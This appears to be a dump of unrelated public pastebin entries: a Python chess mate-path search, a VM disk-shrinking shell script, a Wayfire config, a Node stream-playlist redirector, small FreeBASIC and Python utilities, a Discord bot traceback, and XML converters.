                game_tree[new_node_id] = {'fen': simplified_fen, 'parent': node_id, 'color': chess.WHITE if board.turn else chess.BLACK, 'children': [], 'moves_to_mate': None}
                fen_to_node_id[simplified_fen] = new_node_id
                game_tree[node_id]['children'].append(new_node_id)
                queue.append((new_node_id, 0))
            board.pop()

def update_game_outcomes(game_tree):
    """"""Updates game outcomes focusing only on checkmates.""""""
    for node_id, node in game_tree.items():
        board = chess.Board(node['fen'] + "" 0 1"")
        if board.is_checkmate():
            node['result'] = 1 if board.turn == chess.BLACK else -1  # Black's turn but checkmate means White wins, and vice versa
            node['moves_to_mate'] = 0  # Checkmate is immediate, no more moves required.
        elif board.is_game_over():
            node['result'] = 0  # For draws or stalemates, we consider the result as 0 (this will be ignored in propagation)
            

# def update_parent_preferences(game_tree):
#     def recurse(node_id):
#         node = game_tree[node_id]
#         # If a direct outcome is already determined at this node
#         if 'result' in node:
#             moves_to_mate = 0 if 'moves_to_mate' in node and node['result'] in [-1, 1] else None
#             return node['result'], [node_id], moves_to_mate

#         # Initialize variables to track the best outcome
#         best_result = 0  # Assume draw as default
#         best_path = []
#         best_moves_to_mate = None

#         for child_id in node['children']:
#             child_result, child_path, child_moves_to_mate = recurse(child_id)

#             # Skip paths that don't lead to a decisive outcome
#             if child_result == 0 or child_moves_to_mate is None:
#                 continue

#             # Logic to select the optimal path based on the current node's perspective
#             if best_moves_to_mate is None:
#                 # First child with a decisive outcome sets the initial values
#                 best_result, best_path, best_moves_to_mate = child_result, child_path, child_moves_to_mate
#             else:
#                 if node['color'] == chess.WHITE:
#                     # White seeks to minimize moves to mate when winning
#                     if child_result == 1 and child_moves_to_mate < best_moves_to_mate:
#                         best_result, best_path, best_moves_to_mate = child_result, child_path, child_moves_to_mate
#                 else:
#                     # Black seeks to minimize moves to mate when winning
#                     if child_result == -1 and child_moves_to_mate < best_moves_to_mate:
#                         best_result, best_path, best_moves_to_mate = child_result, child_path, child_moves_to_mate

#         # Update the current node with the optimal outcome found
#         if best_moves_to_mate is not None:
#             node['result'] = best_result
#             node['moves_to_mate'] = 1 + best_moves_to_mate  # Increment for the move to this node
#         else:
#             node['result'] = best_result  # Could be 0 if all children result in a draw
#             node['moves_to_mate'] = None

#         return node['result'], [node_id] + best_path, node.get('moves_to_mate')

#     _, path, _ = recurse(1)  # Start the recursion from the root of the game tree
#     return path

def update_parent_preferences(game_tree):
    def recurse(node_id):
        node = game_tree[node_id]
        if 'result' in node:
            # Node has a direct outcome (win, loss, or draw)
            moves_to_mate = 0 if 'moves_to_mate' in node and node['result'] in [-1, 1] else None
            return node['result'], [node_id], moves_to_mate

        best_result = None  # Track the best outcome (initially undefined)
        best_path = []  # Best path leading to this outcome
        best_moves_to_mate = float('inf')  # Use infinity as a comparison basis for finding the minimum

        for child_id in node['children']:
            child_result, child_path, child_moves_to_mate = recurse(child_id)

            # Skip draws or paths not leading to a decisive outcome
            if child_result == 0 or child_moves_to_mate is None:
                continue

            # Identify and select the best outcome for the current player
            if best_result is None or (child_result == -1 and node['color'] == chess.WHITE and child_moves_to_mate < best_moves_to_mate):
                # For White, a result of -1 (Black win) with fewer moves is worse, so it's avoided unless it's the only outcome
                best_result, best_path, best_moves_to_mate = child_result, child_path, child_moves_to_mate
            elif child_result == 1 and node['color'] == chess.BLACK and child_moves_to_mate < best_moves_to_mate:
                # For Black, similar logic applies but reversed
                best_result, best_path, best_moves_to_mate = child_result, child_path, child_moves_to_mate

        # If a winning path was found, update the node
        if best_result in [-1, 1]:
            node['result'] = best_result
            node['moves_to_mate'] = best_moves_to_mate + 1  # Adjust for the current move
        else:
            # No winning path found, consider it a draw or maintain undefined result
            node['result'] = 0 if best_result is None else best_result
            node['moves_to_mate'] = None

        return node['result'], [node_id] + best_path, node.get('moves_to_mate')

    _, path, _ = recurse(1)  # Starting from the root of the game tree
    return path



# This function assumes that 'game_tree' is a dictionary representing the nodes of your game tree,
# where each node ID maps to a dictionary containing:
# 'fen': The FEN string of the board position,
# 'parent': The parent node ID,
# 'color': The color to move (True for White, False for Black),
# 'children': A list of child node IDs,
# 'result': The game outcome from this position (-1 for Black win, 1 for White win, 0 for draw),
# 'moves_to_mate': The shortest number of moves to mate from this position (if applicable).

# To execute this code, you'll need to define your 'game_tree' variable with the initial game state and
# have the chess positions added to the tree using the 'add_descendants_iteratively' function you've defined.

            
            
# def update_parent_preferences(game_tree):
#     def recurse(node_id):
#         node = game_tree[node_id]
#         if 'result' in node:
#             # Direct outcome detected, set moves_to_mate accordingly
#             moves_to_mate = 0 if 'moves_to_mate' in node and node['result'] in [-1, 1] else None
#             return node['result'], [node_id], moves_to_mate

#         best_result = 0  # Default to draw
#         best_path = []
#         best_moves_to_mate = float('inf')  # Initialize with a large number for comparison

#         for child_id in node['children']:
#             child_result, child_path, child_moves_to_mate = recurse(child_id)
            
#             if child_result == 0 or child_moves_to_mate is None:
#                 continue  # Skip non-result or draw paths

#             # Logic for selecting the shortest path to victory
#             if ((node['color'] == chess.WHITE and child_result == 1) or 
#                 (node['color'] == chess.BLACK and child_result == -1)) and child_moves_to_mate < best_moves_to_mate:
#                 best_result, best_path, best_moves_to_mate = child_result, child_path, child_moves_to_mate

#         if best_moves_to_mate != float('inf'):
#             node['result'] = best_result
#             node['moves_to_mate'] = best_moves_to_mate + 1  # Correctly increment for the move to this node
#         else:
#             node['result'] = best_result  # Draw if no better path found
#             node['moves_to_mate'] = None  # No valid path to victory

#         return node['result'], [node_id] + best_path, node.get('moves_to_mate')

#     result, path, moves_to_mate = recurse(1)  # Assuming 1 is the root node's ID
#     return path
            
            
# def update_parent_preferences(game_tree):
#     def recurse(node_id):
#         node = game_tree[node_id]
#         if 'result' in node:  # Check if the node has a direct outcome
#             return node['result'], [node_id], 0 if 'moves_to_mate' in node else None

#         best_result = 0  # Assume draw as the default outcome
#         best_path = []
#         best_moves_to_mate = None

#         for child_id in node['children']:
#             child_result, child_path, child_moves_to_mate = recurse(child_id)

#             if child_result == 0 or child_moves_to_mate is None:  # Skip draws or paths not leading to checkmate
#                 continue

#             # Ensure we have a valid best_moves_to_mate for comparison
#             if best_moves_to_mate is None:
#                 best_moves_to_mate = child_moves_to_mate
#                 best_result, best_path = child_result, child_path
#             else:
#                 # Compare only if child_moves_to_mate is not None and update accordingly
#                 if node['color'] == chess.WHITE and child_result == 1:
#                     if child_moves_to_mate < best_moves_to_mate:
#                         best_result, best_path, best_moves_to_mate = child_result, child_path, child_moves_to_mate
#                 elif node['color'] == chess.BLACK and child_result == -1:
#                     if child_moves_to_mate > best_moves_to_mate:
#                         best_result, best_path, best_moves_to_mate = child_result, child_path, child_moves_to_mate

#         if best_moves_to_mate is not None:
#             node['result'] = best_result
#             node['moves_to_mate'] = 1 + best_moves_to_mate
#         else:
#             node['result'] = best_result  # could still be 0 if no child paths lead to a win
#             node['moves_to_mate'] = None

#         return node['result'], [node_id] + best_path, node.get('moves_to_mate')

#     result, path, moves_to_mate = recurse(1)  # Start the recursion from the root node.
#     return path


# Make sure to replace or integrate this function into your main execution logic and re-run your analysis.

# def update_parent_preferences(game_tree):
#     def recurse(node_id):
#         node = game_tree[node_id]
#         if 'result' in node:
#             moves_to_mate = 0 if 'moves_to_mate' in node and node['result'] in [-1, 1] else None
#             return node['result'], [node_id], moves_to_mate

#         best_result = 0  # Default outcome
#         best_path = []
#         best_moves_to_mate = float('inf')  # Use infinity as the initial comparison value

#         for child_id in node['children']:
#             child_result, child_path, child_moves_to_mate = recurse(child_id)

#             if child_result == 0 or child_moves_to_mate is None:
#                 continue  # Skip non-result paths

#             # Looking for the shortest path to checkmate for both colors
#             if (child_result == 1 and node['color'] == chess.WHITE) or (child_result == -1 and node['color'] == chess.BLACK):
#                 if child_moves_to_mate < best_moves_to_mate:
#                     best_result, best_path, best_moves_to_mate = child_result, child_path, child_moves_to_mate

#         if best_moves_to_mate != float('inf'):
#             node['result'] = best_result
#             node['moves_to_mate'] = 1 + best_moves_to_mate  # Incrementing for the current move
#         else:
#             node['result'] = 0  # Draw or no path to checkmate found
#             node['moves_to_mate'] = None

#         return node['result'], [node_id] + best_path, node.get('moves_to_mate')

#     _, path, _ = recurse(1)
#     return path


def print_path(game_tree, path):
    """"""Prints the board positions along the path.""""""
    for node_id in path:
        node = game_tree[node_id]
        board = chess.Board(node['fen'] + "" 0 1"")
        moves_to_mate = ""N/A"" if node.get('moves_to_mate') is None else node.get('moves_to_mate')
        print(f""Node ID: {node_id}, Result: {node.get('result', 'N/A')}, Moves to Mate: {moves_to_mate}"")
        print(board,node,""<<\n"")
        print(""---"")

def main():
    initial_fen = ""8/8/8/3k4/8/8/2K2Q2/8 w - - 0 1""  # Example FEN
    initial_fen = ""8/8/8/3k4/8/2K5/5q2/8 w - - 0 1""
    initial_fen = ""8/8/8/3k4/1K6/8/5q2/8 b - - 0 1""
    initial_fen = ""5K2/q7/6k1/8/8/8/8/8 w - - 0 1""
  #  initial_fen = ""6K1/q7/6k1/8/8/8/8/8 b - - 0 1""

    game_tree, fen_to_node_id = initialize_game_tree(initial_fen)
    add_descendants_iteratively(game_tree, fen_to_node_id)
    update_game_outcomes(game_tree)
    path = update_parent_preferences(game_tree)
    print(game_tree[1])
    print(""Path to the outcome:"")
    print_path(game_tree, path)

if __name__ == ""__main__"":
    main()"
hDTjHtjU,shrink_to_export.sh,silek65,Bash,Saturday 16th of March 2024 02:42:08 PM CDT,"#!/bin/sh

VM_SYS_CAPACITY=$(df -h / | tail -n 1 | awk '{print $2}')

echo ""[Hit CTRL+C right NOW! if you previously did NOT read that WARNING]""
sleep 2
echo
echo
echo
echo
echo ""
This script is a helper when shrinking or recovering unused free guest VM disk space.

Note: Hypervisors like Proxmox allows to discard unused free space, QNAP VM clone functions work very similar and in fact
      is equal to: 'qemu-img convert -p -O qcow2 -o compat=1.1,lazy_refcounts ...'

Requirements:
1) Script will perform quick disk defragmentaion to move data from end parts of the disk volume.
   Recommended: Before doing this operation its recommended to manually stop as much services as possible.

once defragmentation is done....
2) free space on the guest will be filled with 0 bytes:
   That means:
   - On the host you have at least: ${VM_SYS_CAPACITY} free space on the datastore - OTHERWISE HIT CTRL+C
   - Critical services like MySQL/MariaDB has to be stopped for safety reasons
     (to prevent crash & corrupt DB disk image will run out of free space)

---- [Hit CTRL+C to ABORT]: 10 seconds left ....""

sleep 10

stop_services(){
	echo Stop critical services....
	service monitorix stop 2>/dev/null 1>/dev/null
	service grafana-server stop 2>/dev/null 1>/dev/null
	service memcached stop 2>/dev/null 1>/dev/null
	service redis-server stop 2>/dev/null 1>/dev/null
	systemctl stop kibana 2>/dev/null 1>/dev/null
	systemctl stop elasticsearch 2>/dev/null 1>/dev/null
	service mysql stop 2>/dev/null 1>/dev/null
	service apache2 stop 2>/dev/null 1>/dev/null
}

start_services(){
	echo Start services once again....
	service mysql start 2>/dev/null 1>/dev/null
	systemctl start elasticsearch 2>/dev/null 1>/dev/null
	systemctl start kibana 2>/dev/null 1>/dev/null
	service apache2 start 2>/dev/null 1>/dev/null
	service monitorix start 2>/dev/null 1>/dev/null
	service grafana-server start 2>/dev/null 1>/dev/null
	service memcached start 2>/dev/null 1>/dev/null
	service redis-server start 2>/dev/null 1>/dev/null
}

drop_cache(){
	echo Drop and flush cache...

	sync
	# drop cache
	sysctl -w vm.drop_caches=3

	# drop memory cache
	echo 3 > /proc/sys/vm/drop_caches
	echo 1 > /proc/sys/vm/compact_memory
	# sync once again
	sync
	# make sure to sync once again
	sync
	# and again for last time
	sync
}

stop_services

drop_cache

# install dependencies
apt update 2>/dev/null 1>/dev/null
apt install fstrim e4defrag 2>/dev/null 1>/dev/null

# do defrag
echo Defragmenting data:
e4defrag /

drop_cache

# fill up hdd with zeros
dd if=/dev/zero of=/zero bs=64k
drop_cache
# cleanup
rm -f /zero

drop_cache

echo Lets trim all devices
fstrim -a -v 2>/dev/null 1>/dev/null


echo Lets trim all devices last time...
fstrim -a -v 2>/dev/null 1>/dev/null

echo Done
echo Please shutdown VM and clone to new VM.

echo [Hit CTRL+C to abort shut-down procedure]
sleep 10
shutdown -P 0"
ew3RPYDu,vm,bluebyt,INI file,Saturday 16th of March 2024 02:32:25 PM CDT,"# Default config for Wayfire
#
# Copy this to ~/.config/wayfire.ini and edit it to your liking.
#
# Take the tutorial to get started.
# https://github.com/WayfireWM/wayfire/wiki/Tutorial
#
# Read the Configuration document for a complete reference.
# https://github.com/WayfireWM/wayfire/wiki/Configuration

# Input configuration ──────────────────────────────────────────────────────────

# Example configuration:
#
# [input]
# xkb_layout = us,fr
# xkb_variant = dvorak,bepo
# xkb_options = grp:win_space_toggle
#
# See Input options for a complete reference.
# https://github.com/WayfireWM/wayfire/wiki/Configuration#input

# Output configuration ─────────────────────────────────────────────────────────

# Example configuration:
[output:Virtual-1]
mode = 2560x1080@50000

# position = 0,0
# transform = normal
# scale = 1.000000
#
# You can get the names of your outputs with wlr-randr.
# https://github.com/emersion/wlr-randr
#
# See also kanshi for configuring your outputs automatically.
# https://wayland.emersion.fr/kanshi/
#
# See Output options for a complete reference.
# https://github.com/WayfireWM/wayfire/wiki/Configuration#output

# Core options ─────────────────────────────────────────────────────────────────

[core]

# List of plugins to be enabled.
# See the Configuration document for a complete list.
plugins = ipc ipc-rules alpha animate autostart command cube decoration expo fast-switcher fisheye foreign-toplevel grid gtk-shell idle invert move oswitch place resize shortcuts-inhibit switcher vswitch wayfire-shell window-rules wm-actions wrot zoom

# Note: [blur] is not enabled by default, because it can be resource-intensive.
# Feel free to add it to the list if you want it.
# You can find its documentation here:
# https://github.com/WayfireWM/wayfire/wiki/Configuration#blur

# Close focused window.
close_top_view = <super> KEY_Q | <alt> KEY_F4

# Workspaces arranged into a grid: 3 × 3.
vwidth = 2
vheight = 2

# Prefer client-side decoration or server-side decoration
preferred_decoration_mode = client

# Mouse bindings ───────────────────────────────────────────────────────────────

# Drag windows by holding down Super and left mouse button.
[move]
activate = <super> BTN_LEFT

# Resize them with right mouse button + Super.
[resize]
activate = <super> BTN_RIGHT

# Zoom in the desktop by scrolling + Super.
[zoom]
modifier = <super>

# Change opacity by scrolling with Super + Alt.
[alpha]
modifier = <super> <alt>

# Rotate windows with the mouse.
[wrot]
activate = <super> <ctrl> BTN_RIGHT

# Fisheye effect.
[fisheye]
toggle = <super> <ctrl> KEY_F

# Startup commands ─────────────────────────────────────────────────────────────

[autostart]

0_0 = dbus-update-activation-environment --systemd WAYLAND_DISPLAY XDG_CURRENT_DESKTOP=Wayfire
0_1 = systemctl --user import-environment WAYLAND_DISPLAY XDG_CURRENT_DESKTOP

# Automatically start background and panel.
# Set to false if you want to override the default clients.
autostart_wf_shell = true
launcher01 = brave-beta
launcher02 = nautilus
launcher03 = gnome-text-editor
launcher04 = gnome-system-monitor
# launcher05 = epiphany
# launcher06 = flatpak run org.gnome.Prompt.Devel
# launcher06 = xfce4-terminal
launcher07 = ironbar
launcher08 = flatpak run org.gnome.Ptyxis.Devel

# background = wf-background
# panel = wf-panel
# dock = wf-dock

# Output configuration
# https://wayland.emersion.fr/kanshi/
outputs = kanshi

# Notifications
# https://wayland.emersion.fr/mako/
notifications = mako

# Screen color temperature
# https://sr.ht/~kennylevinsen/wlsunset/
gamma = wlsunset

# Idle configuration
# https://github.com/swaywm/swayidle
# https://github.com/swaywm/swaylock
# idle = swayidle before-sleep swaylock

# XDG desktop portal
# Needed by some GTK applications
portal = /usr/libexec/xdg-desktop-portal

# Example configuration:
#
# [idle]
toggle = <super> KEY_Z
screensaver_timeout = 120
# dpms_timeout = 600
#
# Disables the compositor going idle with Super + z.
# This will lock your screen after 300 seconds of inactivity, then turn off
# your displays after another 300 seconds.

# Applications ─────────────────────────────────────────────────────────────────

[command]

# Start a terminal
# https://github.com/alacritty/alacritty
binding_terminal = <super> KEY_ENTER
command_terminal = xfce4-terminal

# Start your launcher
# https://hg.sr.ht/~scoopta/wofi
# Note: Add mode=run or mode=drun to ~/.config/wofi/config.
# You can also specify the mode with --show option.
binding_launcher = <super> <shift> KEY_ENTER
command_launcher = wofi

# Screen locker
# https://github.com/swaywm/swaylock
binding_lock = <super> <shift> KEY_ESC
command_lock = swaylock

# Logout
# https://github.com/ArtsyMacaw/wlogout
binding_logout = <super> KEY_ESC
command_logout = wlogout

# Screenshots
# https://wayland.emersion.fr/grim/
# https://wayland.emersion.fr/slurp/
binding_screenshot = KEY_PRINT
command_screenshot = grim $(date '+%F_%T').webp
binding_screenshot_interactive = <shift> KEY_PRINT
command_screenshot_interactive = slurp | grim -g - $(date '+%F_%T').webp

# Volume controls
# https://alsa-project.org
repeatable_binding_volume_up = KEY_VOLUMEUP
command_volume_up = amixer set Master 5%+
repeatable_binding_volume_down = KEY_VOLUMEDOWN
command_volume_down = amixer set Master 5%-
binding_mute = KEY_MUTE
command_mute = amixer set Master toggle

# Screen brightness
# https://haikarainen.github.io/light/
repeatable_binding_light_up = KEY_BRIGHTNESSUP
command_light_up = light -A 5
repeatable_binding_light_down = KEY_BRIGHTNESSDOWN
command_light_down = light -U 5

# Windows ──────────────────────────────────────────────────────────────────────

# Actions related to window management functionalities.
#
# Example configuration:
#
# [wm-actions]
# toggle_fullscreen = <super> KEY_F
# toggle_always_on_top = <super> KEY_X
# toggle_sticky = <super> <shift> KEY_X

# Position the windows in certain regions of the output.
[grid]
#
# ⇱ ↑ ⇲   │ 7 8 9
# ← f →   │ 4 5 6
# ⇱ ↓ ⇲ d │ 1 2 3 0
# ‾   ‾
slot_bl = <super> KEY_KP1
slot_b = <super> KEY_KP2
slot_br = <super> KEY_KP3
slot_l = <super> KEY_LEFT | <super> KEY_KP4
slot_c = <super> KEY_UP | <super> KEY_KP5
slot_r = <super> KEY_RIGHT | <super> KEY_KP6
slot_tl = <super> KEY_KP7
slot_t = <super> KEY_KP8
slot_tr = <super> KEY_KP9
# Restore default.
restore = <super> KEY_DOWN | <super> KEY_KP0

# Change active window with an animation.
[switcher]
next_view = <alt> KEY_TAB
prev_view = <alt> <shift> KEY_TAB

# Simple active window switcher.
[fast-switcher]
activate = <alt> KEY_ESC

# Workspaces ───────────────────────────────────────────────────────────────────

# Switch to workspace.
[vswitch]
binding_left = <ctrl> <super> KEY_LEFT
binding_down = <ctrl> <super> KEY_DOWN
binding_up = <ctrl> <super> KEY_UP
binding_right = <ctrl> <super> KEY_RIGHT
# Move the focused window with the same key-bindings, but add Shift.
with_win_left = <ctrl> <super> <shift> KEY_LEFT
with_win_down = <ctrl> <super> <shift> KEY_DOWN
with_win_up = <ctrl> <super> <shift> KEY_UP
with_win_right = <ctrl> <super> <shift> KEY_RIGHT

# Show the current workspace row as a cube.
[cube]
activate = <ctrl> <alt> BTN_LEFT
# Switch to the next or previous workspace.
#rotate_lefte = <super> <ctrl> KEY_H
#rotate_right = <super> <ctrl> KEY_L

# Show an overview of all workspaces.
[expo]
toggle = <super> KEY_E | hotspot left-top 10x10 200e
# Select a workspace.
# Workspaces are arranged into a grid of 3 × 3.
# The numbering is left to right, line by line.
#
# ⇱ k ⇲
# h ⏎ l
# ⇱ j ⇲
# ‾   ‾
# See core.vwidth and core.vheight for configuring the grid.
select_workspace_1 = KEY_1
select_workspace_2 = KEY_2
select_workspace_3 = KEY_3
select_workspace_4 = KEY_4
select_workspace_5 = KEY_5
select_workspace_6 = KEY_6
select_workspace_7 = KEY_7
select_workspace_8 = KEY_8
select_workspace_9 = KEY_9

# Outputs ──────────────────────────────────────────────────────────────────────

# Change focused output.
[oswitch]
# Switch to the next output.
next_output = <super> KEY_O
# Same with the window.
next_output_with_win = <super> <shift> KEY_O

# Invert the colors of the whole output.
[invert]
toggle = <super> KEY_I

# Send toggle menu event.
[wayfire-shell]
toggle_menu = <super>


[window-rules]

rule_001 = on created if app_id is ""org.gnome.Nautilus"" then move 270 100
rule_002 = on created if app_id is ""org.gnome.Nautilus"" then assign_workspace 0 0

rule_003 = on created if app_id is ""org.gnome.Ptyxis.Devel"" then move 1400 400
rule_004 = on created if app_id is ""org.gnome.Ptyxis.Devel"" then assign_workspace 0 0
rule_004 = on created if app_id is ""org.gnome.Ptyxis.Devel"" then set alpha 0.9

rule_005 = on created if app_id is ""brave-browser-beta"" then assign_workspace 1 0

rule_006 = on created if app_id is ""org.gnome.Epiphany"" then assign_workspace 1 0

rule_007 = on created if app_id is ""gnome-system-monitor"" then assign_workspace 0 1

rule_008 = on created if app_id is ""org.gnome.TextEditor"" then assign_workspace 1 1

rule_003 = on created if app_id is ""org.gnome.Console"" then move 700 500
rule_004 = on created if app_id is ""org.gnome.Console"" then assign_workspace 0 0

rule_003 = on created if app_id is ""xfce4-terminal"" then move 1400 400
rule_004 = on created if app_id is ""xfce4-terminal"" then assign_workspace 0 0

"
bk3T0c5C,CHILEVISION,sagan11,JSON,Saturday 16th of March 2024 02:25:38 PM CDT,"const axios = require('axios');
const Monitor = require('ping-monitor');
const express = require('express');
const url = require('url');
const app = express();

const monitor = new Monitor({
    website: 'https://chv-m3u.chorroaeboy.repl.co',
    title: 'status',
    interval: 5 // minutes
});

monitor.on('up', res => console.log(`${res.website} está encedido.`));
monitor.on('down', res => console.log(`${res.website} se ha caído - ${res.statusMessage}`));
monitor.on('stop', website => console.log(`${website} se ha parado.`) );
monitor.on('error', error => console.log(error));


app.get('/', function(req, res) {
  res.setHeader('Content-Type', 'application/x-mpegURL');
  axios.get('https://www.chilevision.cl/ms_player_src_01/live/1560140104.js')
.then(response => {
    const respuesta = response.data.split(';');
    const token = respuesta[0].replace(/'/g, """").replace('// Señal Online\nvar token = ', '');
    id = respuesta[1].replace(/\n/g, """").replace(/'/g, """").replace('var id = ', '');
    res.redirect(`https://mdstrm.com/live-stream-playlist-v/${id}.m3u8?access_token=${token}`);
  })
})
app.listen(""8080"");"
XGgTcj8M,Pastes.io [Pastebin Alternative],xxsa,PHP,Saturday 16th of March 2024 02:09:29 PM CDT,"https://pastes.io - Paste Tool - Pastebin Alternative - Free

Pastes.io is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

150+ different syntax languages - All Free
Paste Folders
Load files feature
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes
Paste expiration system
Self destroy pastes
Embed, download, print pastes
Socialite (Facebook/Twitter/Google Social login)
Trending pastes page (day, week, month, year)
Password protected pastes
Encrypted pastes
Trending pastes page (day, week, month, year)
No Captcha for logged in users feature
Simple Ads by Google Adsense Few rather than Pastebin"
rjQyitkP,Untitled,Mysoft,FreeBasic,Saturday 16th of March 2024 02:09:07 PM CDT,"#include ""crt.bi""

#define StringPointer(_S) cptr(any ptr ptr,@_S)[0]
#define StringLength(_S)  cptr(integer ptr,@_S)[1]

dim as ubyte n(7) = {asc(""H""),asc(""e""),asc(""l""),asc(""l""),asc(""o"")}
print *cptr(zstring ptr,@n(0))
printf(!""%s\n"",@n(0))

'---- string header manip ----
dim as string sTemp
StringPointer(sTemp) = @n(0)
StringLength(sTemp) = 4
print sTemp 'just 'hell' :)

sleep

"
8rEdfiLM,19 с условием на делимость на 3,nq1s788,Python,Saturday 16th of March 2024 02:05:04 PM CDT,"from functools import lru_cache


def moves(h):
    a = h
    answ = []
    if (a + 1) % 3 != 0:
        answ.append(a + 1)
    if (a + 2) % 3 != 0:
        answ.append(a + 2)
    if (a * 2) % 3 != 0:
        answ.append(a * 2)
    return answ


@lru_cache(None)
def game (h):
    if h >= 151:
        return 'win'
    elif any(game(m) == 'win' for m in moves(h)):
        return'p1'
    elif all (game(m) == 'p1' for m in moves(h)):
        return'v1'
    elif any(game(m) == 'v1' for m in moves(h)):
        return'p2'
    elif all(game(m) in ['p1', 'p2'] for m in moves(h)):
        return'v2'


def p19(h):
    return any(game(m) == 'p1' for m in moves(h))


print([s for s in range(1, 150) if (s % 3 != 0) and game(s) == 'v1'])
print([s for s in range(1, 150) if (s % 3 != 0) and game(s) == 'p2'])
print([s for s in range(1, 150) if (s % 3 != 0) and game(s) == 'v2'])"
hz32MrG8,boostanull,manekta,Python,Saturday 16th of March 2024 02:02:27 PM CDT,"caxapboost:035E02D8-04D3-05FD-4B06-4F0700080009
"
i9jn0cS5,Swimbot Error,swimmerhair,Python,Saturday 16th of March 2024 01:53:24 PM CDT,"Traceback (most recent call last):
  File ""/home/pi/.local/lib/python3.9/site-packages/discord/ext/commands/core.py"", line 85, in wrapped
    ret = await coro(*args, **kwargs)
  File ""/home/pi/Swimbot/cc.py"", line 265, in k
    player.set_thumbnail(url=th_list[int(townhall[10:])])
IndexError: list index out of range
"
qe2XCeP1,update_all_packages,Python253,Python,Saturday 16th of March 2024 01:49:12 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Filename: update_all_packages.py
# Version: 1.00
# Author: Jeoi Reqi

""""""
A Python script to update all installed packages to their latest versions,
excluding those installed in editable mode.

This script utilizes the 'pip' package manager to update all packages installed in the Python environment 
to their latest available versions. It filters out packages installed in editable mode ('-e' flag), 
typically used for development purposes, as these should not be updated automatically.

Requirements:
    - Python (2.7 or later) must be installed on your system.
    - 'pip' package manager must be available in your PATH.

Usage:
    1. Ensure Python and 'pip' are installed and accessible from your command line.
    2. Save this script as 'update_packages.py' in a directory of your choice.
    3. Open a command prompt or terminal window.
    4. Navigate to the directory where 'update_packages.py' is located.
    5. Run the script by executing the following command:
       
       $ python update_packages.py

    6. The script will list all installed packages and their versions, 
       excluding those installed in editable mode. It will then proceed to update 
       each package to its latest available version, displaying the updated packages 
       as it progresses.

Note: It's recommended to review the changes made by the script to ensure 
      compatibility with your projects, as updating packages may introduce 
      breaking changes or unexpected behavior.
""""""

import subprocess
import re

def update_packages():
    # List installed packages
    try:
        output = subprocess.check_output(['pip', 'freeze', '--local'], universal_newlines=True)
        installed_packages = output.split('\n')
    except subprocess.CalledProcessError as e:
        print(""Error:"", e)
        return

    # Filter out editable packages
    filtered_packages = [pkg for pkg in installed_packages if not pkg.startswith('-e')]

    # Extract package names
    package_names = [re.split(r'==|\s+', pkg)[0] for pkg in filtered_packages if pkg]

    # Update packages
    for package in package_names:
        try:
            subprocess.check_call(['pip', 'install', '-U', package])
            print(f""Successfully updated {package}"")
        except subprocess.CalledProcessError as e:
            print(f""Error updating {package}: {e}"")

if __name__ == ""__main__"":
    update_packages()

"
sHJ33wbb,what_browser_is_default,Python253,Python,Saturday 16th of March 2024 01:48:16 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Filename: what_browser_is_default.py
# Version: 1.00
# Author: Jeoi Reqi

""""""
This script retrieves the default web browser set in the Windows registry.

Requirements:
- This script is designed for Windows operating systems.
- Python must be installed on the system.
- The script requires access to the Windows registry.
""""""

import os
import winreg

def get_default_browser_windows():
    try:
        # Open the Windows registry key for HTTP associations
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r""Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice"") as key:
            # Read the ProgId value
            prog_id, _ = winreg.QueryValueEx(key, 'ProgId')
            # Open the registry key for the ProgId
            with winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, f""\\{prog_id}\\shell\\open\\command"") as browser_key:
                # Read the default browser path
                browser_path, _ = winreg.QueryValueEx(browser_key, '')
                # Extract the clean path to the browser executable (remove command-line arguments)
                browser_path = browser_path.split('""')[1]
                return os.path.basename(browser_path), browser_path
    except Exception as e:
        print(""Error:"", e)
        return None, None

def main():
    default_browser, default_browser_path = get_default_browser_windows()
    if default_browser:
        print(""Default Browser:"")
        print(""Name:"", default_browser)
        print(""Path:"", default_browser_path)
    else:
        print(""Default browser not found."")

if __name__ == ""__main__"":
    main()

"
WgzU1uaa,xml2txt,Python253,Python,Saturday 16th of March 2024 01:47:30 PM CDT,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Filename: xml2txt.py
# Version: 1.0.0
# Author: Jeoi Reqi

""""""
Description:
This script converts an XML file (.xml) to a text file (.txt).
It extracts the text content of each element in the XML and writes it to the text file.

Requirements:
- Python 3.x

Usage:
1. Save this script as 'xml2txt.py'.
2. Ensure your XML file ('example.xml') is in the same directory as the script.
3. Run the script.
4. The converted text file ('xml2txt.txt') will be generated in the same directory.

Note: Adjust the 'xml_filename' and 'txt_filename' variables in the script as needed.
""""""

import xml.etree.ElementTree as ET

def xml_to_txt(xml_filename, txt_filename):
    tree = ET.parse(xml_filename)
    root = tree.getroot()

    with open(txt_filename, 'w') as txtfile:
        for element in root.iter():
            if element.text:
                txtfile.write(element.text + '\n')

if __name__ == ""__main__"":
    # Set the filenames for the XML and text files
    xml_filename = 'example.xml'
    txt_filename = 'xml2txt.txt'

    # Convert the XML to a text file
    xml_to_txt(xml_filename, txt_filename)

    print(f""Converted '{xml_filename}' to '{txt_filename}'."")

"
q6iJuYuD,xml2json,Python253,Python,Saturday 16th of March 2024 01:47:08 PM CDT,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Filename: xml2json.py
# Version: 1.0.0
# Author: Jeoi Reqi

""""""
Description:
This script converts an XML file (.xml) to a JSON file (.json).
It extracts text content from all elements in the XML and saves it as a JSON file.

Requirements:
- Python 3.x

Usage:
1. Save this script as 'xml2json.py'.
2. Ensure your XML file ('example.xml') is in the same directory as the script.
3. Run the script.
4. The converted JSON file ('xml2json.json') will be generated in the same directory.

Note: Adjust the 'xml_filename' and 'json_filename' variables in the script as needed.
""""""

import json
import xml.etree.ElementTree as ET

def xml_to_json(xml_filename, json_filename):
    tree = ET.parse(xml_filename)
    root = tree.getroot()
    data = {""xml_content"": []}

    for element in root.iter():
        if element.text:
            data[""xml_content""].append(element.text)

    with open(json_filename, 'w') as jsonfile:
        json.dump(data, jsonfile, indent=2)

if __name__ == ""__main__"":
    # Set the filenames for the XML and JSON files
